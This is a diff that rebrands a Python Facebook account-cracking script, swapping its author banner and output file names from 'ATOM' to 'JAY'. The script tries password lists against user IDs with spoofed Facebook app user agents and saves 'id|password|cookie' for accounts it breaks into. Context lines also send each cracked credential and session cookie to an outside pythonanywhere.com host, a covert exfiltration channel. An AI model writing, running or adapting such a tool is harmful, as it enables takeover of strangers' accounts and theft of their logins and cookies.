@@ -147,19 +147,21 @@ def clear():
 os.system('xdg-open ')
 faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"  
 logo=(f"""
-{faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
+{faltu} {black}"Confidence is my best accessory".... {pvt}
 \033[1;32m
-    █████╗ ████████╗ ██████╗ ███╗   ███╗
-   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
-   ███████║   ██║   ██║   ██║██╔████╔██║
-   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
-   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ
-\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
-\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
-\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;36mRandom 
-\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+   d88b  .d8b.  db    db 
+   `8P' d8' `8b `8b  d8' 
+    88  88ooo88  `8bd8'  
+    88  88~~~88    88    
+db. 88  88   88    88    
+Y8888P  YP   YP    YP \033[1;34m ᴾᴿᴼ
+                                               
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;32m[\033[1;31m✓\033[1;32m] Author     : MR JAY
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : =(.)=
+\033[1;32m[\033[1;31m✓\033[1;32m] TODAY      : {datex}
+\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types :\033[1;36m RANDOM 
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 #====================[HOME-PAGE]==========================
 def ___ERROR___():
@@ -415,7 +417,7 @@ def ___NP___():
 def randm(ids,psd,tl):
     global oks,cps,loop
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r {red}[{abir}SR-JAY{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -472,8 +474,8 @@ def randm(ids,psd,tl):
                 check = check_lock(idss)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){idss}|{pas}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{idss}|{pas}|{coki}\n")
+                        print(f"{cyan}(JAY-NV){idss}|{pas}")
+                        open("/sdcard/JAY-NV-COOKIE.txt", "a").write(f"{idss}|{pas}|{coki}\n")
                         break
                     else:
                         bkas.append(idss)
@@ -481,9 +483,9 @@ def randm(ids,psd,tl):
                            statusok = (f"{idss}|{pas}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {idss}|{pas} ")
+                           print(f" {green}(JAY-OK) {idss}|{pas} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{idss}|{pas}|{coki}\n")
+                           open("/sdcard/JAY-COOKIE-OK.txt", "a").write(f"{idss}|{pas}|{coki}\n")
                            oks.append(idss)
                            break
                 else:
@@ -503,7 +505,7 @@ def randm(ids,psd,tl):
 def randm1(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}SR-JAY{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -585,7 +587,7 @@ def randm1(ids,psd,tl):
 def randm2(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}SR-JAY{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -669,7 +671,7 @@ def randm2(ids,psd,tl):
 def randm3(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}SR-JAY{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{R4}',
     session=requests.Session()
